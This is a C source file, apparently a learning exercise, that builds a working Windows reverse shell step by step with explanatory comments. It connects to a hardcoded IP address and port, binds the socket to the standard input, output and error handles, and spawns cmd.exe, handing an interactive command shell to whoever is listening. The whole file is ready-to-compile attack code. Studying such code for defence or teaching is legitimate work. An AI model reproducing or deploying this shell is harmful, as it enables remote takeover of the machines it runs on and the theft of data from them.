#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <ws2tcpip.h>
//Let's Create a basic windows reverse shell in C.
//Let's import necessary libraries.

//additional libraries. (pragma) > to specify the linker to winsock libraries.
#pragma comment(lib, "Ws2_32.lib")

//Entry Point 
int main()
{
    //Create a shell socket essentials.
    SOCKET shell;
    struct sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si; //Infrastructure to process creation
    PROCESS_INFORMATION pi;//Infrastructure to process creation.
    char buffer[1024];
    int connect;
    char ip_addr[] = "192.168.1.52";
    int port = 8888;

    //Implement the WSA startup function.
    WSAStartup(MAKEWORD(2, 2), &wsa); //Initialization of the winsock.

    //Create a TCP connection stream socket.//specify protocol also.
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);


    //Let's include initialized shell_addr details.
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    //Now will implement connect option.
    connect = WSAConnect(shell, (struct sockaddr*) &shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); //Connect to the target server.

    //if connect function not worked correctly print the error
    if(connect == SOCKET_ERROR)
    {
        printf("Unable to establish a connection with the server.\n");
        exit(0); //Terminate the program.
    }

    //if the connection was success do the following
    else
    {
        //implement recv.(Socket_Descripter, Buffer, Sizeof the buffer, Null as 0).
        recv(shell, buffer, sizeof(buffer), 0);

        //want set the memory size to 0 for startup infrastructure.
        memset(&si, 0, sizeof(si));

        //We want to open up a shell to structures we neeed > STARTUPINFO and PROCESSINFO.
        //1st want to specify the infrastructure size > cb member of the SI infrastucture.
        si.cb = sizeof(si);

        //Now specify the dwflags of startup infrstructure.
        //dwflags determine specific behaviours on thred creation.
        si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);

        //now need to pipe input and output and error. > to shell descripter(SOCKET) > as shown below.
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;


        //To spawn the cmd we need to call createprocess api.
        //Create take 10 argumentes > Application to load, CMD line to execute, Process attributes, thread attributes, inherit handles(bool), creation flags, environment, current_directory, memloc of startup infra, memloc of process info infra.
        char cmd[] = "cmd.exe";
        //API to create the process.
        CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        //Now the program will need to wait until the process is signalled.
        //hProcess Handle newly created process while the excution of the CreateProcess API.
        WaitForSingleObject(pi.hProcess, INFINITE);
        //close the handle and threads after the execution.
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        //Now need to set the recv response buffer to 0.
        memset(buffer, 0, sizeof(buffer));

    }

}
